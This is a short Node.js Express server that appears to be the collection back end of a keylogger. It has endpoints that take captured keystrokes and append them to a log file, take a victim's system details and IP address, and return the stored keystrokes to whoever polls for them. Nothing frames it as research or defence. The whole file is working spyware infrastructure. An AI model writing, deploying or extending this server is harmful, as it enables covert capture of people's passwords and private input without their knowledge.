import express, { json } from 'express';
import fs from 'fs';
import cors from 'cors';

const app = express();
const port = 3000;

app.use(json());
app.use(cors());  

let keystrokes = "";

app.post('/keystrokes', (req, res) => {
    const keystrokesReceived = req.body.keystrokes; 
    
    if (keystrokesReceived) {
        keystrokes += keystrokesReceived;
        fs.appendFileSync('logs.txt', keystrokesReceived);
    }
    
    console.log('Keystrokes received:', keystrokesReceived);
    res.status(200).send('Keystrokes received');
});

app.post('/getStrokes', (_req, res) => {
    res.status(200).json({"keystrokes": keystrokes});
    keystrokes = ""; 
});

app.post('/systemdetails', (req, res) => {
    console.log('System details received:', req.body);
    res.status(200).send('System details received');
});

app.post('/ipaddress', (req, res) => {
    console.log('IP address received:', req.body);
    res.status(200).send('IP address received');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
